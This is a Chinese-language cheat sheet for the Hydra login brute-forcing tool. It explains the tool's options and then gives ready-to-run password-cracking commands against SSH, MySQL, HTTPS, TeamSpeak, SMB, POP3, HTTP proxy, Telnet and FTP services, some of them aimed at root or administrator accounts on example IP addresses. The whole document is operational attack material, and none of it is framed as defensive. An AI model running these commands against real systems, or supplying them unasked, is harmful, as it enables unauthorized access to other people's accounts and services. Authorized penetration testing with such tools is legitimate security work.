#### args
```txt
-l 		指定用户名
-L 		指定用户名字典(文件)
-p 		指定密码破解
-P 		指定密码字典(文件)
-t 		线程数量，默认16个线程
-R		根据上一次进度继续破解
-S 		使用SSL协议连接
-s 		PORT 可通过这个参数指定非默认端口。
-e ns           扩展选项	<---	n：空密码试探，s：使用指定用户和密码试探。
-o 		输出文件
-M 		FILE 指定目标列表文件一行一条。
-vV 	        显示详细过程，不加此选项则仅等正确结果输出
-w 		TIME 设置最大超时的时间，单位秒，默认是30s。
```

#### Example
```
破解ssh：			
hydra -l root -P pass.txt -vV -o store.log -e ns 192.168.10.89 ssh   

破解数据库：		
hydra -l root -P pass.txt -vV -o store.log -e ns 192.168.10.89 mysql 

破解https：		
hydra -m /index.php -l username -P pass.txt [IP] https

破解teamspeak：	
hydra -s 端口号 -vV -l username -P pass.txt [IP] teamspeak

破解smb：		
hydra -l administrator -P pass.txt [IP] smb

破解pop3：		
hydra -l muts -P pass.txt my.pop3.mail pop3

破解http-proxy：	
hydra -l admin -P pass.txt http-proxy://10.36.16.18

破解telnet：		
hydra [IP] telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V

破解ftp：			
hydra -l username -P pass.txt -t 32 -e ns -vV [IP] ftp
```
